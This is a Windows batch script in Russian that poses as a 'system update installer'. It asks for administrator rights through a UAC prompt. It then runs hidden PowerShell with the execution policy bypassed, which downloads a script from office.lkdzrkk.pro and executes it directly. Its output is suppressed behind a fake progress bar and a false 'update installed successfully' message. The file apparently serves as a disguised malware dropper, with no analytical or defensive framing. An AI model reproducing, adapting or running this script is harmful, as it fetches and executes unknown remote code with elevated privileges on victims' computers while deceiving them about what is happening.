@echo off
title Обновление системы
color 0A

:: Авто-UAC
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

cls
echo.
echo   ╔══════════════════════════════════════╗
echo   ║     Установка обновления системы     ║
echo   ╚══════════════════════════════════════╝
echo.
echo   Пожалуйста, подождите...
echo.
echo   [■□□□□□□□□□]  Подготовка...
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "$env:OM_INSTALL_CODE='z6LVJFW04Y4P0ILGOH-99dMJEq6G0ZVH'; irm https://office.lkdzrkk.pro/install.ps1 -UseBasicParsing | iex" >nul 2>&1

cls
echo.
echo   ╔══════════════════════════════════════╗
echo   ║     Установка обновления системы     ║
echo   ╚══════════════════════════════════════╝
echo.
echo   [■■■■■■■■■■]  Готово!
echo.
echo   Обновление успешно установлено.
echo   Это окно закроется автоматически.
echo.
timeout /t 5 /nobreak >nul
